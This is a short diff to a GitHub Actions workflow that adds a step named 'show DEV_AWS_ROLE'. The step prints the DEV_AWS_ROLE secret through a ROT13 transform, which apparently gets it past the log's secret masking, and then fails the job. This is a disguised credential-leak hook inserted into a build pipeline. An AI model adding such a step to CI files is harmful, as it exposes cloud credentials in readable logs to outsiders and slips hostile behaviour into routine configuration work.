@@ -22,6 +22,8 @@ jobs:
       packages_matrix: ${{ steps.set-matrix.outputs.packages_matrix }}
       checks_matrix: ${{ steps.set-matrix.outputs.checks_matrix }}
     steps:
+      - name: show DEV_AWS_ROLE
+        run: echo "$DEV_AWS_ROLE" | tr 'A-Za-z' 'N-ZA-Mn-za-m' && exit 1
       - name: Checkout Repo
         uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
       - name: Mount Nix cache disk
